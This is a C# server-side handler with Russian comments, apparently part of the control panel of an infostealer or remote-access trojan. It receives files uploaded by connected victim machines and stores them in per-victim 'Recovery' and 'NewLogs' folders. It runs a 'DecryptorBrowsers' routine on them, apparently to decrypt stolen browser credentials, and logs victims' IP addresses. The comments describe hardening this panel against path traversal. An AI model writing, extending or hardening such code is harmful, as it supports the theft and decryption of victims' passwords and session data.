using System;
using System.Drawing;
using System.IO;
using Server.Connectings;
using Server.Helper;

namespace Server.Messages;

internal class HandlerRecovery1 // Убедитесь, что имя класса верное
{
    public static void Read(Clients clients, object[] array)
    {
        // 1. Получаем непроверенный идентификатор (часть пути) от клиента.
        string untrustedId = array[1]?.ToString();

        if (string.IsNullOrEmpty(untrustedId))
        {
            clients.Disconnect();
            return;
        }

        // 2. Определяем безопасные базовые директории.
        string usersBaseDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Users");
        string newLogsBaseDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "NewLogs");

        // 3. Используем наш новый безопасный метод для получения полных путей.
        string clientUserPath = PathSanitizer.SanitizeAndResolvePath(untrustedId, usersBaseDir);
        string clientNewLogsPath = PathSanitizer.SanitizeAndResolvePath(untrustedId, newLogsBaseDir);

        // 4. ГЛАВНАЯ ПРОВЕРКА: Если какой-либо из путей null, это была попытка атаки (Path Traversal).
        if (clientUserPath == null || clientNewLogsPath == null)
        {
            Methods.AppendLogs(clients.IP, "Path Traversal-атака была заблокирована.", Color.Red);
            clients.Disconnect();
            return;
        }

        try
        {
            // 5. Создаем безопасные пути для файлов и папок.
            string recoveryPath = Path.Combine(clientUserPath, "Recovery");
            string sourceInfoFile = Path.Combine(clientUserPath, "Information.txt");
            string destInfoFileNewLogs = Path.Combine(clientNewLogsPath, "InformationLeb.txt");
            string destInfoFileRecovery = Path.Combine(recoveryPath, "InformationLeb.txt");

            // Убеждаемся, что директории существуют.
            Directory.CreateDirectory(recoveryPath);
            Directory.CreateDirectory(clientNewLogsPath);

            // 6. Используем только безопасные, полные пути.
            Methods.AppendLogs(clients.IP, "Save logs in: " + recoveryPath, Color.MediumPurple);
            DynamicFiles.Save(recoveryPath, (object[])array[2]);
            DynamicFiles.Save(clientNewLogsPath, (object[])array[2]);
            DecryptorBrowsers.Start(recoveryPath);
            DecryptorBrowsers.Start(clientNewLogsPath);

            // Проверяем, что исходный файл существует перед копированием
            if (File.Exists(sourceInfoFile))
            {
                File.Copy(sourceInfoFile, destInfoFileNewLogs, true);
                File.Copy(sourceInfoFile, destInfoFileRecovery, true);
            }
        }
        catch (Exception ex)
        {
            Methods.AppendLogs(clients.IP, "Ошибка при обработке файлов: " + ex.Message, Color.Red);
        }
        finally
        {
            clients.Disconnect();
        }
    }
}